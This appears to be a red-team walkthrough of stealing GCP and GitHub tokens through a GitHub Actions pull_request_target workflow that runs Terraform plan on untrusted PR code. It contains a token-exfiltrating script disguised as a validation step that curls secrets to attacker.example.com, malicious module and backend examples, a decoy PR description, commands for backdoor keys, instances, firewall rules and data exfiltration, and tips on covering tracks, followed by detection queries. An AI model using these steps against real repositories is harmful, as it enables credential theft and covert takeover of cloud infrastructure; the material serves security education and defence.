# Attack Walkthrough: Terraform Plan Token Theft via GitHub Actions

> **WARNING**: This document is for authorized security testing and educational
> purposes only. Unauthorized access to computer systems is illegal. Only perform
> these techniques in environments you own or have explicit written authorization
> to test.

## Table of Contents

1. [Attack Overview](#attack-overview)
2. [Prerequisites](#prerequisites)
3. [The Vulnerability Chain](#the-vulnerability-chain)
4. [Step-by-Step Attack](#step-by-step-attack)
5. [Post-Exploitation](#post-exploitation)
6. [Detection Indicators](#detection-indicators)
7. [References](#references)

---

## Attack Overview

This attack exploits a common misconfiguration in GitHub Actions workflows that
perform Terraform operations on pull requests. The core vulnerability is the
combination of:

1. **`pull_request_target` trigger** - Runs with write permissions and secret access
2. **Explicit checkout of PR head** - Executes untrusted code from the PR author
3. **Workload Identity Federation** - Provides a valid GCP access token to the workflow
4. **Terraform plan execution** - Runs arbitrary code through data sources, providers, and modules

### Attack Kill Chain

```
Attacker opens PR ──> pull_request_target fires ──> Workflow checks out PR code
        │                                                      │
        │                    ┌─────────────────────────────────┘
        │                    ▼
        │          GCP OIDC token exchanged ──> Terraform init (malicious code)
        │                    │                          │
        │                    ▼                          ▼
        │          Access token in env       Malicious provider/module loaded
        │                    │                          │
        │                    └──────────┬───────────────┘
        │                               ▼
        │                    Terraform plan executes
        │                               │
        │                               ▼
        │                    Attacker's code runs with:
        │                    - GCP access token
        │                    - GitHub write token
        │                    - OIDC identity
        │                               │
        │               ┌───────────────┼───────────────┐
        │               ▼               ▼               ▼
        │        Steal GCP token   Modify TF state   Call GCP APIs
        │               │               │               │
        │               ▼               ▼               ▼
        └────>   Exfiltrate to    Inject backdoor   Create resources
              attacker server     resources         directly
```

### Impact

- **Confidentiality**: Attacker obtains valid GCP credentials
- **Integrity**: Attacker can modify cloud infrastructure and Terraform state
- **Availability**: Attacker can destroy or disrupt cloud resources

---

## Prerequisites

For this attack to work, the target repository must have:

- [ ] A GitHub Actions workflow using `pull_request_target` trigger
- [ ] The workflow checks out the PR head ref (`github.event.pull_request.head.sha`)
- [ ] The workflow authenticates to GCP using Workload Identity Federation
- [ ] The workflow runs `terraform plan` on the checked-out code
- [ ] The attacker can open PRs (public repo or org member with fork access)

The attacker needs:

- [ ] A GitHub account that can fork the repo or create a branch
- [ ] An external server to receive exfiltrated tokens (or use GitHub artifacts)
- [ ] Understanding of the target's Terraform configuration

---

## The Vulnerability Chain

### Why `pull_request_target` Is Dangerous

GitHub provides two PR triggers with fundamentally different security models:

| Aspect | `pull_request` | `pull_request_target` |
|--------|---------------|----------------------|
| Runs code from | Merge commit (PR + base) | Base branch |
| Secrets access | No (for forks) | Yes |
| GITHUB_TOKEN permissions | Read-only (for forks) | Write (defined in workflow) |
| OIDC token | Not available (for forks) | Available |
| Safe to checkout PR code? | Yes (already sandboxed) | **NO** |

The design intent of `pull_request_target` is to let maintainers run privileged
operations (like labeling or commenting) using code from the base branch. The
critical mistake is checking out the PR's code and then running it.

### Why Terraform Plan Is Not "Read-Only"

Many teams assume `terraform plan` is safe because it "only reads." This is false:

1. **`external` data source**: Executes arbitrary shell commands during plan
2. **`http` data source**: Makes HTTP requests to arbitrary URLs
3. **Custom providers**: Run arbitrary Go code during plan
4. **Module sources**: Can point to attacker-controlled Git repos or registries
5. **`local-exec` provisioners**: Execute shell commands (in some plan contexts)
6. **Provider initialization**: Providers can execute code during `terraform init`

---

## Step-by-Step Attack

### Step 1: Reconnaissance

Identify the target workflow:

```bash
# Clone the target repo
git clone https://github.com/target-org/infra-repo.git
cd infra-repo

# Find workflows that use pull_request_target
grep -r "pull_request_target" .github/workflows/

# Check if the workflow checks out PR code
grep -A5 "actions/checkout" .github/workflows/terraform-plan.yml
# Look for: ref: ${{ github.event.pull_request.head.sha }}
#       or: ref: ${{ github.event.pull_request.head.ref }}

# Identify the GCP authentication method
grep -A10 "google-github-actions/auth" .github/workflows/terraform-plan.yml

# Find the Terraform backend
cat terraform/backend.tf
```

### Step 2: Fork and Prepare the Attack

```bash
# Fork the repository on GitHub, then clone your fork
git clone https://github.com/attacker/infra-repo.git
cd infra-repo
git checkout -b feature/update-storage-config
```

### Step 3: Inject Malicious Terraform Code

The attacker has several options. The most subtle is an `external` data source.

**Option A: Malicious External Data Source**

Add to any `.tf` file:

```hcl
# This looks like a legitimate validation script
data "external" "validate_config" {
  program = ["bash", "${path.module}/scripts/validate.sh"]
}
```

Where `scripts/validate.sh` steals the token:

```bash
#!/bin/bash
# Appears to validate configuration but actually exfiltrates tokens

# Steal GCP access token
GCP_TOKEN="${GOOGLE_OAUTH_ACCESS_TOKEN:-${CLOUDSDK_AUTH_ACCESS_TOKEN:-}}"

# Steal GitHub token
GH_TOKEN="${ACTIONS_RUNTIME_TOKEN:-${GITHUB_TOKEN:-}}"

# Exfiltrate to attacker-controlled server
curl -s -X POST https://attacker.example.com/collect \
  -H "Content-Type: application/json" \
  -d "{\"gcp_token\": \"${GCP_TOKEN}\", \"gh_token\": \"${GH_TOKEN}\"}"

# Must output valid JSON for terraform to continue
echo '{"result": "valid"}'
```

**Option B: Malicious Terraform Module**

```hcl
module "storage_helper" {
  source = "github.com/attacker/terraform-gcp-helper//modules/storage"
  # This module contains a local-exec provisioner that steals tokens
}
```

**Option C: Modified Backend Configuration**

```hcl
# Redirect state operations through attacker's proxy
terraform {
  backend "http" {
    address        = "https://attacker.example.com/state"
    lock_address   = "https://attacker.example.com/state/lock"
    unlock_address = "https://attacker.example.com/state/lock"
  }
}
```

### Step 4: Submit the Pull Request

```bash
git add .
git commit -m "feat: update storage bucket configuration for compliance"
git push origin feature/update-storage-config
```

Then open a PR against the target repository. The PR description should look
legitimate to avoid scrutiny:

```
## Changes
- Updated storage bucket lifecycle rules for data retention compliance
- Added versioning configuration per security audit recommendation
- Minor variable naming cleanup
```

### Step 5: Token Theft During Plan Execution

When the `pull_request_target` workflow fires:

1. The workflow checks out the attacker's code (because of `ref: head.sha`)
2. GCP authentication happens via OIDC, placing the access token in the environment
3. `terraform init` downloads the attacker's malicious providers/modules
4. `terraform plan` executes data sources, running the attacker's code
5. The attacker's code reads the GCP token from the environment and exfiltrates it

The attacker receives the token on their server:

```json
{
  "gcp_token": "ya29.c.b0AXv0zTP...<valid GCP access token>...",
  "gh_token": "ghs_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
}
```

### Step 6: Use Stolen GCP Token

The stolen access token is valid for the service account's permissions:

```bash
# Set the stolen token
export GOOGLE_OAUTH_ACCESS_TOKEN="ya29.c.b0AXv0zTP..."

# List what the service account can access
gcloud projects list --access-token-file=<(echo $GOOGLE_OAUTH_ACCESS_TOKEN)

# List GCS buckets (including the TF state bucket)
gsutil ls

# Download the Terraform state
gsutil cp gs://my-production-project-tf-state/terraform/state/default.tfstate .

# List compute instances
gcloud compute instances list

# List IAM bindings
gcloud projects get-iam-policy my-production-project
```

### Step 7: Modify Terraform State (State Injection)

With access to the GCS state bucket, the attacker can inject resources:

```bash
# Download current state
gsutil cp gs://my-production-project-tf-state/terraform/state/default.tfstate ./state.json

# Modify state to add a backdoor service account
python3 inject_state.py state.json

# Upload modified state
gsutil cp ./state.json gs://my-production-project-tf-state/terraform/state/default.tfstate
```

The state injection can:
- Add unauthorized IAM bindings that Terraform "manages"
- Modify resource attributes to create backdoors
- Remove resources from state so Terraform won't track them
- Change resource dependencies to cause failures

### Step 8: Direct GCP API Exploitation

The attacker can also bypass Terraform entirely:

```bash
# Create a backdoor service account key
gcloud iam service-accounts keys create backdoor-key.json \
  --iam-account=terraform-ci@my-production-project.iam.gserviceaccount.com

# Create a compute instance for persistence
gcloud compute instances create attacker-instance \
  --zone=us-central1-a \
  --machine-type=e2-micro \
  --image-family=debian-11 \
  --image-project=debian-cloud

# Modify firewall rules
gcloud compute firewall-rules create allow-attacker \
  --direction=INGRESS \
  --allow=tcp:22 \
  --source-ranges=ATTACKER_IP/32

# Exfiltrate data from BigQuery
bq query --use_legacy_sql=false 'SELECT * FROM dataset.sensitive_table LIMIT 1000'

# Modify Cloud Functions to add backdoors
gcloud functions deploy backdoor-function \
  --runtime=python39 \
  --trigger-http \
  --allow-unauthenticated
```

---

## Post-Exploitation

### Maintaining Access

Once the attacker has the initial token, they can establish persistence:

1. **Create Service Account Keys**: Generate long-lived credentials
2. **Add IAM Bindings**: Grant their own account access
3. **Deploy Backdoor Functions**: Create serverless backdoors
4. **Modify Audit Logging**: Disable or redirect Cloud Audit Logs
5. **Create VPN/SSH Tunnels**: Establish network-level access

### Covering Tracks

The attacker may attempt to:

- Delete Cloud Audit Log entries (if they have sufficient permissions)
- Modify the Terraform state to hide injected resources
- Close the PR quickly to minimize the window of scrutiny
- Use the GitHub token to approve and merge a cleanup PR

---

## Detection Indicators

### In GitHub Actions

- Workflows triggered by `pull_request_target` with checkout of PR code
- Unexpected outbound network connections during `terraform plan`
- Plan execution taking longer than usual (network exfiltration adds latency)
- Terraform plan output containing unexpected data sources or modules

### In GCP

- Unusual API calls from the Terraform CI service account
- Service account key creation events for CI service accounts
- IAM binding modifications outside of normal Terraform apply windows
- GCS object access to the Terraform state bucket outside of CI
- API calls from IP addresses not matching GitHub Actions runners
- Access token usage after the workflow has completed

### Cloud Audit Log Queries

```sql
-- Detect service account key creation
SELECT
  timestamp,
  protoPayload.methodName,
  protoPayload.resourceName,
  protoPayload.authenticationInfo.principalEmail
FROM `my-production-project.logs.cloudaudit_googleapis_com_activity`
WHERE
  protoPayload.methodName = 'google.iam.admin.v1.CreateServiceAccountKey'
  AND timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)
ORDER BY timestamp DESC;

-- Detect state bucket access from non-CI sources
SELECT
  timestamp,
  protoPayload.methodName,
  protoPayload.resourceName,
  protoPayload.requestMetadata.callerIp
FROM `my-production-project.logs.cloudaudit_googleapis_com_data_access`
WHERE
  protoPayload.resourceName LIKE '%tf-state%'
  AND protoPayload.requestMetadata.callerIp NOT IN (
    -- GitHub Actions IP ranges
    SELECT ip_range FROM `reference_data.github_actions_ips`
  )
ORDER BY timestamp DESC;
```

---

## References

- [GitHub Security: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [GitHub Docs: Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows)
- [Google: Workload Identity Federation](https://cloud.google.com/iam/docs/workload-identity-federation)
- [HashiCorp: Terraform External Data Source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/external)
- [OWASP: Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [Cycode: Terraform Plan is Not Harmless](https://cycode.com/blog/terraform-plan-is-not-harmless/)
